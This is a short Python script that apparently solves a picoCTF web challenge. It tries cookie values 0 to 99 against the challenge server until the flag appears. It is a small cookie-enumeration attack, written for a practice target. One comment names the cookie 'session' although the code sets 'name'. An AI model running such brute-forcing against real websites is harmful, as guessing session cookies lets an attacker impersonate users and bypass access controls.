import requests
from tqdm import tqdm

url = 'http://mercury.picoctf.net:64944/'
for i in tqdm(range(100)):
    cookies = {'name': str(i)}  # 设置 cookie 名称为 'session'
    r = requests.get(url, cookies=cookies)  # 使用 cookies 参数
    if 'picoCTF' in r.text:
        print(r.text)
        break
